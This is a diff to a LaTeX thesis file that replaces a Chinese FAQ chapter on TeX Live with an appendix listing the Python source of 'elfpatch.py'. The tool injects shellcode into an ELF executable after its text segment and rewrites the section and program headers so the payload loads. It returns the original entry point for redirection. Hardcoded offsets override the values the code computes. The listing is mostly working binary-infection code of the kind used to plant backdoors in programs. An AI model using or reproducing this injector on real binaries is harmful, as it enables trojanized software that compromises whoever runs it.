@@ -1,34 +1,100 @@
 % !Mode:: "TeX:UTF-8"
-\chapter{常见问题}
-\label{chapter-faq}
+\chapter{ELF注入工具源代码}
+\label{python}
+%%
 \begin{enumerate}
-\item 本模板如何使用？
-\label{faq-howtouse}
-\begin{itemize}
-    \item 按照第2章的要求，先下载和安装相应的软件，推荐使用\TeX{}Live2012或更新的版本；
-    \item 下载cls文件；
-    \item 使用tex的编辑器或其他编辑器，编写论文，注意保存为UTF-8编码；
-    \item xelatex编译。
-\end{itemize}
-注意：\TeX{}Live2012的ISO镜像在\href{http://buaabt.cn/showtopic-214948.aspx}{未来花园BT站}上
-有相应的种子可下载，亦可从TUG的\href{http://www.tug.org/texlive/acquire-iso.html}{官方网站}上下载。
-\item Windows下的msmake.bat如何使用？
-\label{faq-msmake}
-\begin{itemize}
-    \item 使用Windows的CMD命令行，进入到msmake.bat所在目录；
-    \item 键入~msmake~后会显示相应的帮助文件；
-    \item 按照所显示的相关信息再键入相应命令即可。
-\end{itemize}
-注意：由于此批处理文件为编者自行编写，学识有限，代码有许多不如人意之处，
-如对此批处理文件有问题可直接邮件联系我(mrpeng000@gmail.com)即可。
-\item 使用TexLive如何更新？
-\label{faq-texliveupdate}
-TUG官方推荐\TeX{}Live通过镜像站进行更新，具体步骤为：
-\begin{itemize}
-    \item 在“开始”目录下的TeXLive2012文件夹下，找到有TeX Live Manage程序；
-    \item 在菜单“tlmgr”下选择“载入其他仓库”，选择最近的仓库即可（如果是北航校内用户并能够
-    访问到\href{http://mirror.buaa.edu.cn/}{北航开源镜像站}的话，可以在仓库地址中
-    输入\texttt{http://mirror.buaa.edu.cn/CTAN/systems/texlive/tlnet/}）；
-    \item 按照目录选择更新。
-\end{itemize}
+ \item elfpatch.py源代码
 \end{enumerate}
+\begin{lstlisting}[
+  language={python},
+]
+import struct
+import os
+import sys
+import shutil
+from elf_helper import *
+from elfbin import elfbin
+
+class elfpatch():
+    def __init__(self, FILE, OUTPUT,SHELLCODE,OBJECT_FILE):
+        self.FILE = FILE
+        self.OUTPUT = OUTPUT
+        self.bin_file = open(self.FILE, "r+b")
+        self.SHELLCODE = SHELLCODE
+        self.OBJECT_FILE = OBJECT_FILE
+        self.elfbin = elfbin(self.FILE)
+    
+    def patch_elf(self):
+        shutil.copy2(self.FILE, self.OUTPUT)
+        print "[*] Patching Binary"
+        self.bin_file = open(self.OUTPUT, "r+b")
+
+        if not self.OBJECT_FILE:
+          shellcode = to_binary_code(self.SHELLCODE)
+        else:
+          shellcode = to_binary_code(get_text_section(self.OBJECT_FILE))
+        newBuffer = len(shellcode)
+        self.bin_file.seek(24, 0)
+
+        sh_addr = 0x0
+        offsetHold = 0x0
+        sizeOfSegment = 0x0
+        shellcode_vaddr = 0x0
+        headerTracker = 0x0
+        PAGE_SIZE = 4096
+        for header, values in self.elfbin.prog_hdr.iteritems():
+            if values['p_type'] == 0x1:
+                print "[+] Found text segment"
+                shellcode_vaddr = values['p_vaddr'] + values['p_filesz']
+                oldentry = self.elfbin.e_entry
+                headerTracker = header
+                newOffset = values['p_offset'] + values['p_filesz']
+                break
+        shellcode_vaddr = 0x00308000 + 0xce186
+        newOffset = 0x000060 + 0xce186
+        self.bin_file.seek(0)
+        file_1st_part = self.bin_file.read(newOffset)
+        newSectionOffset = self.bin_file.tell()
+        file_2nd_part = self.bin_file.read()
+
+        self.bin_file.close()
+        self.bin_file = open(self.OUTPUT, "w+b")
+        self.bin_file.write(file_1st_part)
+        self.bin_file.write(shellcode)
+        self.bin_file.write("\x00" * (PAGE_SIZE - len(shellcode)))
+        self.bin_file.write(file_2nd_part)
+        if self.elfbin.EI_CLASS == 0x01:
+            self.bin_file.seek(24, 0)
+            self.bin_file.seek(8, 1)
+            self.bin_file.write(struct.pack(self.elfbin.endian + "I", self.elfbin.e_shoff + PAGE_SIZE))
+            self.bin_file.seek(self.elfbin.e_shoff + PAGE_SIZE, 0)
+            for i in range(self.elfbin.e_shnum):
+                if self.elfbin.sec_hdr[i]['sh_offset'] >= newOffset:
+                    self.bin_file.seek(16, 1)
+                    self.bin_file.write(struct.pack(self.elfbin.endian + "I", self.elfbin.sec_hdr[i]['sh_offset'] + PAGE_SIZE))
+                    self.bin_file.seek(20, 1)
+                elif self.elfbin.sec_hdr[i]['sh_size'] + self.elfbin.sec_hdr[i]['sh_addr'] == shellcode_vaddr:
+                    self.bin_file.seek(20, 1)
+                    self.bin_file.write(struct.pack(self.elfbin.endian + "I", self.elfbin.sec_hdr[i]['sh_size'] + newBuffer))
+                    self.bin_file.seek(16, 1)
+                else:
+                    self.bin_file.seek(40,1)
+            after_textSegment = False
+            self.bin_file.seek(self.elfbin.e_phoff,0)
+            for i in range(self.elfbin.e_phnum):
+                if i == headerTracker:
+                    after_textSegment = True
+                    self.bin_file.seek(16, 1)
+                    self.bin_file.write(struct.pack(self.elfbin.endian + "I", self.elfbin.prog_hdr[i]['p_filesz'] + newBuffer))
+                    self.bin_file.write(struct.pack(self.elfbin.endian + "I", self.elfbin.prog_hdr[i]['p_memsz'] + newBuffer))
+                    self.bin_file.seek(8, 1)
+                elif after_textSegment is True:
+                    self.bin_file.seek(4, 1)
+                    self.bin_file.write(struct.pack(self.elfbin.endian + "I", self.elfbin.prog_hdr[i]['p_offset'] + PAGE_SIZE))
+                    self.bin_file.seek(24, 1)
+                else:
+                    self.bin_file.seek(32,1)
+        self.bin_file.close()
+        print "[!] Patching Complete"
+        return (oldentry,shellcode_vaddr)
+\end{lstlisting}
